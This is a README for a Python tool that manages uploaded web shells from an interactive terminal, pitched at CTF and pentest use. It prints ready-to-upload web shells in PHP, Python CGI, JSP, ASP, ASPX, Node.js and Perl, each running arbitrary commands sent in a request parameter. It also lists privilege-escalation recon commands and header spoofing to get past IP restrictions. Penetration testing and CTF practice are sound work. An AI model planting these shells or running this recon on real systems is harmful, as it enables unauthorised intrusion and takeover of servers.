<div align="center">

```
  _________.__           .__  .__  __      __                                 
 /   _____/|  |__   ____ |  | |  |/  \    /  \ ____ _____ ___  __ ___________ 
 \_____  \ |  |  \_/ __ \|  | |  |\   \/\/   // __ \\__  \\  \/ // __ \_  __ \
 /        \|   Y  \  ___/|  |_|  |_\        /\  ___/ / __ \\   /\  ___/|  | \/
/_______  /|___|  /\___  >____/____/\__/\  /  \___  >____  /\_/  \___  >__|   
        \/      \/     \/                \/       \/     \/          \/       

```

**The most convenient web shell manager built for CTF.**  
A fully interactive, colored pseudo-TTY CLI for PHP, ASP, JSP and any other web shell — no browser, no curl, no pain.

[![Python](https://img.shields.io/badge/Python-3.8%2B-3776AB?logo=python&logoColor=white)](https://python.org)
[![License](https://img.shields.io/badge/License-MIT-22c55e)](LICENSE)
[![Platform](https://img.shields.io/badge/Platform-Linux%20%7C%20Windows%20%7C%20macOS-6366f1)](#installation)
[![CTF](https://img.shields.io/badge/Purpose-CTF%20%2F%20Pentest-ef4444)](#disclaimer)

![Main interface](./shellweaver/img/demonstration.png)

</div>

---

## Table of Contents

- [Table of Contents](#table-of-contents)
- [The Problem](#the-problem)
- [Features](#features)
- [Requirements](#requirements)
- [Installation](#installation)
  - [Linux and macOS](#linux-and-macos)
  - [Windows](#windows)
  - [Quick install without a virtualenv](#quick-install-without-a-virtualenv)
- [Launching ShellWeaver](#launching-shellweaver)
- [Command Reference](#command-reference)
  - [Main Prompt — `Weaver ›`](#main-prompt--weaver-)
  - [Interactive Session TTY](#interactive-session-tty)
  - [Keyboard Shortcuts](#keyboard-shortcuts)
- [Web Shell Payload Reference](#web-shell-payload-reference)
  - [PHP](#php)
  - [Python CGI](#python-cgi)
  - [JSP (Java)](#jsp-java)
  - [ASP / ASPX](#asp--aspx)
  - [Node.js](#nodejs)
  - [Perl CGI](#perl-cgi)
- [Full CTF Workflow Example](#full-ctf-workflow-example)
- [Project Architecture](#project-architecture)
  - [How the layers talk to each other](#how-the-layers-talk-to-each-other)
  - [SOLID principles at a glance](#solid-principles-at-a-glance)
- [Tips and Tricks](#tips-and-tricks)
- [Disclaimer](#disclaimer)

---

## The Problem

After getting RCE on a CTF target you are usually stuck doing things like this:

```bash
# Typing payloads in a browser address bar — no history, no colours
http://10.10.10.5/shell.php?cmd=ls+-la

# Repeating curl calls — slow, clunky, no CWD tracking
curl "http://10.10.10.5/shell.php?cmd=cat+/etc/passwd"
```

Neither gives you a real shell experience. You lose track of where you are,
you constantly retype commands, and juggling multiple targets at once is a nightmare.

**ShellWeaver replaces all of that** with an interactive TTY that lives inside
your existing terminal:

```
www-data@web01:/var/www/html $ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)

www-data@web01:/var/www/html $ cd /tmp && ls -la
total 24
drwxrwxrwt  6 root root 4096 Apr 20 12:11 .
...
```

---

## Features

| | Feature | Detail |
|---|---|---|
| 🎨 | **Rich colours everywhere** | Banner, tables, prompts, output — powered by `rich` |
| 🐚 | **Real pseudo-TTY** | `user@host:/cwd $` prompt, CWD tracked across every request |
| 🗂 | **Multi-session management** | Unlimited parallel shells — all visible in one `list` table |
| 🔄 | **`fg` / `bg` job control** | Background a shell, work elsewhere, foreground it again |
| 👤 | **Auto context detection** | `whoami`, `hostname`, `pwd`, OS and shell type on connect |
| 🖥️ | **OS-aware command wrapping** | Correct syntax for Linux *and* Windows targets automatically |
| 🔐 | **Auth support** | Per-session custom HTTP headers and cookies |
| 🔒 | **SSL bypass** | Verification disabled by default — works with self-signed CTF certs |
| ↕️ | **Tab completion** | All commands *and* 20+ common enumeration payloads tab-complete |
| 📜 | **Per-session history** | Arrow keys recall previous commands inside each shell |
| 🔁 | **Auto-suggest** | Ghost-text completions as you type (like fish shell) |
| 🏷️ | **Session labels** | Rename sessions (`rename 1 root-shell`) to stay organised |

---

## Requirements

- **Python 3.8** or higher
- **pip**
- Network connectivity to the target's web shell URL

Python dependencies (installed automatically):

| Package | Version | Purpose |
|---|---|---|
| `requests` | ≥ 2.31.0 | HTTP transport |
| `urllib3` | ≥ 2.0.0 | SSL/connection internals |
| `rich` | ≥ 13.7.0 | Terminal colours, tables, panels |
| `prompt_toolkit` | ≥ 3.0.43 | Readline, history, tab-completion |

---

## Installation

### Linux and macOS

```bash
# 1. Enter the project directory
cd ShellWeaver

# 2. Create an isolated virtual environment (recommended)
python3 -m venv venv

# 3. Activate it
source venv/bin/activate

# 4. Install ShellWeaver and all dependencies
pip install -e .
```

The `shellweaver` command is now on your PATH whenever the virtualenv is active.

To make it available **system-wide without activating** the virtualenv every time:

```bash
pip install --user -e .
```

Make sure `~/.local/bin` is in your `$PATH` (it usually is on modern distros).

---

### Windows

Open **PowerShell** or **Command Prompt** in the `ShellWeaver` folder:

```powershell
# 1. Create a virtual environment
python -m venv venv

# 2. Activate it
venv\Scripts\activate

# 3. Install ShellWeaver
pip install -e .
```

> **Tip:** Use [Windows Terminal](https://aka.ms/terminal) for the best colour and Unicode
> rendering. ShellWeaver also works in the classic `cmd.exe` prompt, but colours
> require Windows 10 version 1903 or newer.

To deactivate the virtualenv when you are done:

```powershell
deactivate
```

---

### Quick install without a virtualenv

If you just want to run it immediately without creating a virtualenv:

```bash
# Install dependencies directly
pip install requests "urllib3>=2.0.0" rich "prompt_toolkit>=3.0.43"

# Run via the convenience entry point
python run.py
```

---

## Launching ShellWeaver

```bash
# If installed via pip install -e .
shellweaver

# Or always works regardless of installation
python run.py
```

On first launch you will see the banner and the main prompt:

![Main prompt menu](./shellweaver/img/mainprompt.png)

---

## Command Reference

### Main Prompt — `Weaver ›`

These commands are available at the main `Weaver ›` prompt.

| Command | Description | Example |
|---|---|---|
| `add <url> <param> [method]` | Open a new web shell session. `method` defaults to `GET`. | `add http://10.0.0.5/sh.php cmd POST` |
| `list` | Show all active sessions in a colour table | `list` |
| `fg <id>` | Foreground a session — enter the interactive TTY | `fg 1` |
| `info <id>` | Display a detailed panel for one session | `info 2` |
| `rename <id> <label>` | Attach a human-readable label to a session | `rename 1 root-shell` |
| `header <id> <key> <value>` | Set a persistent HTTP request header for this session | `header 1 X-Forwarded-For 127.0.0.1` |
| `cookie <id> <key> <value>` | Set a persistent request cookie for this session | `cookie 1 PHPSESSID deadbeef` |
| `kill <id>` | Terminate and remove a session | `kill 3` |
| `help` | Print the full command reference inside the app | `help` |
| `exit` / `quit` | Exit ShellWeaver | `exit` |

**Notes**

- `method` accepts `GET` or `POST` only.
- Multiple sessions can be open simultaneously. Use `list` to see them all.
- `rename` is cosmetic — it changes nothing on the target.
- `header` and `cookie` values persist for all future requests in that session.

---

### Interactive Session TTY

After `fg <id>` you are inside the session. The prompt mirrors what a real shell looks like:

```
www-data@web01:/var/www/html $
```

| Command | Description |
|---|---|
| `<any command>` | Execute on the remote target and display output |
| `bg` | Background this session and return to `Weaver ›` |
| `exit` | Kill this session and return to `Weaver ›` |
| `info` | Print current session details (OS, user, shell, CWD, …) |
| `refresh` | Re-probe `whoami` / `hostname` / `pwd` to sync context |
| `history` | Print all commands run in this session |

**How CWD tracking works**

Every command is automatically wrapped with `cd <cwd>` before execution and a
sentinel-delimited `pwd` after it, so the working directory is reliably updated
from the server's response even across stateless HTTP requests.

On **Windows targets** the wrapper uses `cd /d "<cwd>" & <cmd> & echo __SW_CWD__ & cd`,
so directory tracking works correctly whether the shell is `cmd.exe` or PowerShell.

---

### Keyboard Shortcuts

These work inside both the main prompt and any interactive session:

| Key | Action |
|---|---|
| `↑` / `↓` | Navigate command history |
| `Tab` | Auto-complete command or payload |
| `→` | Accept the grey auto-suggestion |
| `Ctrl+C` | Background the current session (or abort typed input) |
| `Ctrl+D` | Same as `Ctrl+C` when on an empty line |

---

![Tab auto-complete](./shellweaver/img/tabcompl.png)

## Web Shell Payload Reference

Upload one of these to the target first, note the URL and the parameter name,
then use `add <url> <param> [method]` in ShellWeaver.

### PHP

**GET — one-liner, simplest**
```php
<?php system($_GET['cmd']); ?>
```
```
Weaver › add http://target/shell.php cmd GET
```

**POST — less visible in access logs**
```php
<?php system($_POST['cmd']); ?>
```
```
Weaver › add http://target/shell.php cmd POST
```

**Full stderr capture — recommended**
```php
<?php
$cmd = isset($_REQUEST['cmd']) ? $_REQUEST['cmd'] : '';
echo shell_exec($cmd . ' 2>&1');
?>
```
```
Weaver › add http://target/shell.php cmd GET
```

**`proc_open` variant — works when `system` / `shell_exec` are disabled**
```php
<?php
$cmd = $_REQUEST['cmd'];
$descriptors = [1 => ['pipe','w'], 2 => ['pipe','w']];
$proc = proc_open($cmd, $descriptors, $pipes);
echo stream_get_contents($pipes[1]) . stream_get_contents($pipes[2]);
proc_close($proc);
?>
```

---

### Python CGI

```python
#!/usr/bin/env python3
import cgi, os
print("Content-Type: text/plain\n")
form = cgi.FieldStorage()
cmd  = form.getvalue("cmd", "")
if cmd:
    print(os.popen(cmd + " 2>&1").read())
```
```
Weaver › add http://target/cgi-bin/shell.py cmd GET
```

---

### JSP (Java)

```jsp
<%@ page import="java.io.*" %>
<%
    String cmd = request.getParameter("cmd");
    if (cmd != null) {
        Process p = Runtime.getRuntime().exec(new String[]{"/bin/sh","-c",cmd});
        BufferedReader br = new BufferedReader(new InputStreamReader(p.getInputStream()));
        StringBuilder sb = new StringBuilder();
        String line;
        while ((line = br.readLine()) != null) sb.append(line).append("\n");
        out.print(sb);
    }
%>
```
```
Weaver › add http://target/shell.jsp cmd GET
```

---

### ASP / ASPX

**Classic ASP**
```asp
<%
  Dim cmd : cmd = Request.QueryString("cmd")
  Set sh = Server.CreateObject("WScript.Shell")
  Set ex = sh.Exec("cmd.exe /c " & cmd)
  Response.Write ex.StdOut.ReadAll()
%>
```

**ASPX (C#)**
```aspx
<%@ Page Language="C#" %>
<%
  string cmd = Request["cmd"];
  var p = new System.Diagnostics.Process();
  p.StartInfo.FileName = "cmd.exe";
  p.StartInfo.Arguments = "/c " + cmd;
  p.StartInfo.UseShellExecute = false;
  p.StartInfo.RedirectStandardOutput = true;
  p.Start();
  Response.Write(p.StandardOutput.ReadToEnd());
%>
```
```
Weaver › add http://target/shell.aspx cmd GET
```

---

### Node.js

```javascript
// Save as shell.js and run with: node shell.js
const http = require('http');
const { execSync } = require('child_process');
const url  = require('url');

http.createServer((req, res) => {
    const cmd = url.parse(req.url, true).query.cmd || '';
    try {
        res.end(execSync(cmd, { timeout: 10000, stdio: 'pipe' }).toString());
    } catch (e) {
        res.end((e.stderr || e.message).toString());
    }
}).listen(8080, '0.0.0.0');
```
```
Weaver › add http://target:8080/ cmd GET
```

---

### Perl CGI

```perl
#!/usr/bin/perl
use strict;
use warnings;
use CGI;

my $q   = CGI->new;
my $cmd = $q->param('cmd') // '';
print $q->header('text/plain');
print `$cmd 2>&1` if $cmd;
```
```
Weaver › add http://target/cgi-bin/shell.pl cmd GET
```

---

## Full CTF Workflow Example

A realistic end-to-end example: file upload leads to RCE, privilege escalation recon.

```
$ shellweaver

   ____  _          _ _       __
  / ___|| |__   ___| | |     / /...

Weaver › add http://10.10.10.42/uploads/sw.php cmd GET
  ℹ  Connecting to http://10.10.10.42/uploads/sw.php …
  ✔  Session 1 opened  www-data@web01  🐧 Linux / bash
  ℹ  Use fg 1 to interact or list to view all sessions.

Weaver › fg 1
  ✔  Foregrounded session 1  🐧  www-data@web01  bash
  ℹ  bg → background   exit → kill session   refresh → re-probe context

www-data@web01:/var/www/html/uploads $ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)

www-data@web01:/var/www/html/uploads $ uname -a
Linux web01 5.15.0-92-generic #102-Ubuntu SMP Wed Jan 10 09:33:48 UTC 2024 x86_64

www-data@web01:/var/www/html/uploads $ sudo -l
User www-data may run the following commands on web01:
    (ALL) NOPASSWD: /usr/bin/find

# Background the low-priv session and add an admin panel shell
www-data@web01:/var/www/html/uploads $ bg
  ℹ  Session backgrounded.

Weaver › add http://10.10.10.42/admin/debug.php exec POST
  ℹ  Connecting to http://10.10.10.42/admin/debug.php …
  ✔  Session 2 opened  root@web01  🐧 Linux / sh

Weaver › rename 1 www-data
Weaver › rename 2 root

Weaver › list
╭──────────────────────────────── Active Sessions ─────────────────────────────────╮
│  ID  Label     URL                               Param  OS       Shell  User      │
│   1  www-data  http://10.10.10.42/uploads/…      cmd    Linux    bash   www-data  │
│   2  root      http://10.10.10.42/admin/…        exec   Linux    sh     root      │
╰──────────────────────────────────────────────────────────────────────────────────╯

Weaver › fg 2
  ✔  Foregrounded session 2  🐧  root@web01  sh

root@web01:/var/www/html/admin $ cat /root/root.txt
flag{sh3llw3av3r_m4k3s_ctf_3asy}

root@web01:/var/www/html/admin $ exit
  ℹ  Session terminated.

Weaver › kill 1
  ✔  Session 1 terminated.

Weaver › exit
  ✔  Goodbye.
```

---

## Project Architecture

```
ShellWeaver/
├── run.py                 ← Convenience entry point  (python run.py)
├── setup.py               ← pip-installable package  (pip install -e .)
├── requirements.txt       ← Pinned dependencies
├── .gitignore
├── README.md
└── shellweaver/
    ├── __init__.py        ← Package init, re-exports VERSION
    ├── config.py          ← All app-wide constants (VERSION, timeouts, sentinel)
    ├── exceptions.py      ← Custom exception hierarchy
    ├── network.py         ← HTTP transport (GET/POST, headers, cookies, SSL)
    ├── detector.py        ← Remote OS / shell / user / cwd auto-detection
    ├── session.py         ← Single shell entity — owns client, tracks CWD
    ├── manager.py         ← Session CRUD (application service layer)
    ├── ui.py              ← All rich rendering — zero business logic (SRP)
    └── cli.py             ← Command router + interactive TTY loop
```

### How the layers talk to each other

```
cli.py  ──uses──►  manager.py  ──creates──►  session.py
  │                                               │
  │                                        ┌──────┴──────┐
  │                                   network.py    detector.py
  │
  └──renders──►  ui.py
```

### SOLID principles at a glance

| Principle | Applied where |
|---|---|
| **S — Single Responsibility** | `ui.py` only renders; `network.py` only does HTTP; `detector.py` only probes |
| **O — Open / Closed** | `NetworkClient` is open for extension (subclass for proxy support) without touching `session.py` |
| **L — Liskov Substitution** | `ShellDetector` accepts any object with `.execute()` — swap in a mock for testing |
| **I — Interface Segregation** | `SessionManager` exposes minimal CRUD — callers never reach session internals |
| **D — Dependency Inversion** | `session.py` depends on `NetworkClient` abstraction, not raw `requests` calls |

---

## Tips and Tricks

**Shell behind cookie-based authentication**

```
Weaver › add http://target/admin/shell.php cmd GET
Weaver › cookie 1 PHPSESSID your-session-token-here
Weaver › fg 1
```

**Shell behind a reverse proxy that blocks direct IPs**

```
Weaver › header 1 X-Real-IP 127.0.0.1
Weaver › header 1 X-Forwarded-For 127.0.0.1
```

**Shell requiring a bearer token**

```
Weaver › header 1 Authorization "Bearer eyJhbGciOiJIUzI1NiJ9..."
```

**Quick privilege escalation enumeration (paste into any session)**

```bash
# SUID binaries — GTFOBins candidates
find / -perm -4000 -type f 2>/dev/null

# World-writable files
find / -writable -type f 2>/dev/null | grep -v proc

# Sudo permissions
sudo -l

# Running processes
ps aux | grep -v '\[' | head -30

# Interesting files in home dirs
ls -la /home/*/ /root/ 2>/dev/null

# Cron jobs
cat /etc/crontab; ls -la /etc/cron*
```

**CWD got out of sync after a complex command?**

```
www-data@web01:/tmp $ refresh
  ✔  Context refreshed.
```

**See everything that has been run in this session**

```
www-data@web01:/tmp $ history
     1  id
     2  uname -a
     3  cat /etc/passwd
```

---

## Disclaimer

> ShellWeaver is intended **exclusively** for legal, authorised security research
> and Capture The Flag (CTF) competitions.
>
> **Do not use this tool against any system you do not own or do not have explicit
> written permission to test.** Unauthorised access to computer systems is a
> criminal offence in most jurisdictions.
>
> The authors accept **no liability** for any misuse of this software.
